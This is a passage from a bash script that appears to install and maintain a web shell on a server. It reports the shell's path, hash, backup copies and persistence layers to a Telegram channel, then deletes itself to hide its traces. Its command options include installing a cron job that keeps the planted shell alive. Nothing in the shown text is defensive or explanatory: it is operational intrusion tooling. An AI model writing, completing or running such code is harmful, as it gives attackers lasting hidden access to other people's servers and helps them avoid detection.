    # 7. Telegram
    echo -e "\n${CYAN}[+] Sending Telegram notification...${NC}"
    tg_send "✅ INSTALL SUCCESS
🔐 Mode: ${PRIV_MODE}
📁 Webshell: \`${target}\`
📊 MD5: \`${md5}\`
📦 Backups: ${#BACKUP_LOCATIONS[@]}
🔄 Persistence: layers"
    echo -e "  ${GREEN}✅ Telegram notification sent${NC}"

    # 8. Self-destruct main script
    echo -e "\n${CYAN}[+] Self-destructing main script...${NC}"
    echo -e "${GREEN}[+] DONE! ${PRIV_MODE} protection active!${NC}"
    echo -e "${GREEN}[+] Use: bash ${SCRIPT_COPIES[0]} --status${NC}\n"

    # Delay then delete
    (sleep 1 && rm -f -- "$SCRIPT_PATH") &
}

# ─── ENTRY POINT ──────────────────────────────────────────────
case "${1:-}" in
    --file)
        [[ -z "${2:-}" ]] && { echo -e "${RED}[!] --file requires a path${NC}"; usage; exit 1; }
        do_install "$2"
        ;;
    --status)
        do_status
        ;;
    --uninstall)
        do_uninstall
        ;;
    --restore-internal)
        do_restore_internal
        ;;
    --install-cron)
        load_config
        install_cron "$DEFEND_WEBSHELL" "$DEFEND_MD5"
        ;;
    --help|-h|"")
        usage
        ;;
    *)
        echo -e "${RED}[!] Unknown argument: ${1}${NC}"
        usage
        exit 1
        ;;
esac
